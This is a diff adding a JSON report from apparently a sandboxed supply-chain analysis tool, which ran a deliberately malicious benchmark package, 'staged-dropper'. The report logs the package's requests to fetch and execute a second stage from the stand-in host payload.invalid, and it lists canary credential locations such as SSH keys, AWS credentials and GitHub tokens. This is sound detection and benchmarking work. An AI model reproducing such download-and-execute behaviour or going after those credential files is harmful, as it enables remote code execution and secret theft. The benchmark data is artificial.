@@ -1,0 +1,788 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "staged-dropper",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "c644eebd900d8f576cf34b12406d6b141e6d326ee493b623a95d4d7ae9843389",
+  "path": "bench/packages/malicious/staged_dropper"
+ },
+ "run": {
+  "sandbox": "bwrap",
+  "network": "sinkhole",
+  "canaries": [
+   "ssh_key",
+   "aws_creds",
+   "npmrc",
+   "gcloud_creds",
+   "docker_config",
+   "aws_secret_env",
+   "github_token_env"
+  ],
+  "phases": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles": [
+   "dev",
+   "ci"
+  ],
+  "variants": [
+   "default",
+   "clock+30d"
+  ],
+  "started_at": "2026-10-27T11:56:02.959102+00:00",
+  "duration_s": 4.88,
+  "stub": false,
+  "tool_versions": {
+   "python": "Python 3.12.3",
+   "bwrap": "bubblewrap 0.9.0",
+   "strace": "strace -- version 6.8",
+   "libfaketime": "/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1"
+  }
+ },
+ "events": [
+  {
+   "id": "ev0",
+   "seq": 106,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://payload.invalid/stage.py",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev1",
+   "seq": 107,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "host": "payload.invalid"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev2",
+   "seq": 108,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev3",
+   "seq": 109,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80",
+    "data_head": "GET /stage.py HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: payload.invalid\r\nUser-Agent: Python-urllib/3.12\r\nConnection: close\r\n\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "attempted",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev4",
+   "seq": 110,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "download_exec",
+   "detail": {
+    "code_sha256": "2c172c9305a7bb0997ebc3727ea55dfeb039f036bd9347fc1c447087d3cb3606",
+    "decoded_snippet": "stage = 'trustlens-sinkhole-marker'\nprint('sinkhole-stage-2')\n",
+    "source_kind": "compile",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev5",
+   "seq": 111,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "download_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "trustlens-sinkhole-marker sinkhole-stage-2",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev6",
+   "seq": 112,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "",
+    "data_head": "GET /stage.py HTTP/1.1\\r\nAccept-Encoding: identity\\r\nHost: payload.invalid\\r\nUser-Agent: Python-urllib/3.12\\r\nConnection: close\\r\n\\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "strace",
+    "file": null,
+    "line": null,
+    "syscall": "net"
+   }
+  },
+  {
+   "id": "ev7",
+   "seq": 113,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "",
+    "data_head": "GET /stage.py HTTP/1.1\\r\nAccept-Encoding: identity\\r\nHost: payload.invalid\\r\nUser-Agent: Python-urllib/3.12\\r\nConnection: close\\r\n\\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "strace",
+    "file": null,
+    "line": null,
+    "syscall": "net"
+   }
+  },
+  {
+   "id": "ev8",
+   "seq": 114,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://payload.invalid/stage.py",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev9",
+   "seq": 115,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "host": "payload.invalid"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev10",
+   "seq": 116,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev11",
+   "seq": 117,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80",
+    "data_head": "GET /stage.py HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: payload.invalid\r\nUser-Agent: Python-urllib/3.12\r\nConnection: close\r\n\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "attempted",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev12",
+   "seq": 118,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "download_exec",
+   "detail": {
+    "code_sha256": "2c172c9305a7bb0997ebc3727ea55dfeb039f036bd9347fc1c447087d3cb3606",
+    "decoded_snippet": "stage = 'trustlens-sinkhole-marker'\nprint('sinkhole-stage-2')\n",
+    "source_kind": "compile",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev13",
+   "seq": 119,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "download_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "trustlens-sinkhole-marker sinkhole-stage-2",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev14",
+   "seq": 226,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://payload.invalid/stage.py",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev15",
+   "seq": 227,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "host": "payload.invalid"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev16",
+   "seq": 228,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev17",
+   "seq": 229,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80",
+    "data_head": "GET /stage.py HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: payload.invalid\r\nUser-Agent: Python-urllib/3.12\r\nConnection: close\r\n\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "attempted",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev18",
+   "seq": 230,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "download_exec",
+   "detail": {
+    "code_sha256": "2c172c9305a7bb0997ebc3727ea55dfeb039f036bd9347fc1c447087d3cb3606",
+    "decoded_snippet": "stage = 'trustlens-sinkhole-marker'\nprint('sinkhole-stage-2')\n",
+    "source_kind": "compile",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev19",
+   "seq": 231,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "download_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "trustlens-sinkhole-marker sinkhole-stage-2",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev20",
+   "seq": 232,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "",
+    "data_head": "GET /stage.py HTTP/1.1\\r\nAccept-Encoding: identity\\r\nHost: payload.invalid\\r\nUser-Agent: Python-urllib/3.12\\r\nConnection: close\\r\n\\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "strace",
+    "file": null,
+    "line": null,
+    "syscall": "net"
+   }
+  },
+  {
+   "id": "ev21",
+   "seq": 233,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "",
+    "data_head": "GET /stage.py HTTP/1.1\\r\nAccept-Encoding: identity\\r\nHost: payload.invalid\\r\nUser-Agent: Python-urllib/3.12\\r\nConnection: close\\r\n\\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "strace",
+    "file": null,
+    "line": null,
+    "syscall": "net"
+   }
+  },
+  {
+   "id": "ev22",
+   "seq": 234,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://payload.invalid/stage.py",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev23",
+   "seq": 235,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "host": "payload.invalid"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev24",
+   "seq": 236,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev25",
+   "seq": 237,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "127.0.0.1:80",
+    "data_head": "GET /stage.py HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: payload.invalid\r\nUser-Agent: Python-urllib/3.12\r\nConnection: close\r\n\r\n"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "attempted",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev26",
+   "seq": 238,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "download_exec",
+   "detail": {
+    "code_sha256": "2c172c9305a7bb0997ebc3727ea55dfeb039f036bd9347fc1c447087d3cb3606",
+    "decoded_snippet": "stage = 'trustlens-sinkhole-marker'\nprint('sinkhole-stage-2')\n",
+    "source_kind": "compile",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev27",
+   "seq": 239,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "download_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "trustlens-sinkhole-marker sinkhole-stage-2",
+    "lineage": "download_exec"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/staged_dropper/__init__.py",
+    "line": 8,
+    "layer": "audit"
+   }
+  }
+ ],
+ "static_signals": [],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default",
+   "clock+30d"
+  ],
+  "triggers_run": [
+   "call_all",
+   "fresh_startup",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "sinkhole",
+  "callables_total": 1,
+  "callables_exercised": 1,
+  "native_skipped": [],
+  "strace_layer": true,
+  "not_observed": [
+   "no console-script entry points to run"
+  ],
+  "whitelisted_or_dropped_events": 212
+ },
+ "canaries": [
+  {
+   "id": "ssh_key",
+   "kind": "file",
+   "where": ".ssh/id_rsa",
+   "token": "TLCANARYSSHKEYc2bf2ea4c78a"
+  },
+  {
+   "id": "aws_creds",
+   "kind": "file",
+   "where": ".aws/credentials",
+   "token": "TLCANARYAWSCREDS84632d65777f"
+  },
+  {
+   "id": "npmrc",
+   "kind": "file",
+   "where": ".npmrc",
+   "token": "TLCANARYNPMRCe8deac1e0301"
+  },
+  {
+   "id": "gcloud_creds",
+   "kind": "file",
+   "where": ".config/gcloud/application_default_credentials.json",
+   "token": "TLCANARYGCLOUDCREDSd08233fe9894"
+  },
+  {
+   "id": "docker_config",
+   "kind": "file",
+   "where": ".docker/config.json",
+   "token": "TLCANARYDOCKERCONFIGb87a5a1211e5"
+  },
+  {
+   "id": "aws_secret_env",
+   "kind": "env",
+   "where": "AWS_SECRET_ACCESS_KEY",
+   "token": "TLCANARYAWSSECRETENV6c19d30d2561"
+  },
+  {
+   "id": "github_token_env",
+   "kind": "env",
+   "where": "GITHUB_TOKEN",
+   "token": "TLCANARYGITHUBTOKENENV2461fcb68cb4"
+  }
+ ],
+ "capability_summary": {
+  "download_exec": {
+   "phases": [
+    "call"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 8,
+   "canary_hit": false
+  },
+  "network": {
+   "phases": [
+    "call"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 20,
+   "canary_hit": false
+  }
+ }
+}
